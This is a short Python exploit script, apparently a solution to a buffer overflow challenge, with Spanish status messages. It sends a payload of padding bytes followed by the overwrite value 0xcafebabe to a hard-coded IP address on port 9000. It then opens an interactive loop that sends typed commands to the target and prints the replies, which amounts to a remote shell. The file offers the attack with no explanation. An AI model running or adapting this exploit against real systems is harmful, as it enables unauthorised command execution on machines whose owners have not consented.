import socket
import time


payload = b"A" * 48
payload += b"B" * 4
payload += b"\xbe\xba\xfe\xca"


def connect_and_execute(server_ip, server_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server_ip, server_port))

    print(f"Conectado a {server_ip}:{server_port}")
    s.sendall(payload)
    try:
        while True:
            command = input("$ ")
            s.sendall((command + '\n').encode())
            response = receive_data(s)
            print(response.decode())

    except KeyboardInterrupt:
        print("\nDesconexión...")
        s.close()


def receive_data(sock):
    time.sleep(1)
    sock.settimeout(2)
    data = b""
    try:
        while True:
            part = sock.recv(1024)
            if not part:
                break
            data += part
    except socket.timeout:
        pass
    return data


if __name__ == "__main__":

    server_ip = "128.61.240.205"
    server_port = 9000
    connect_and_execute(server_ip, server_port)
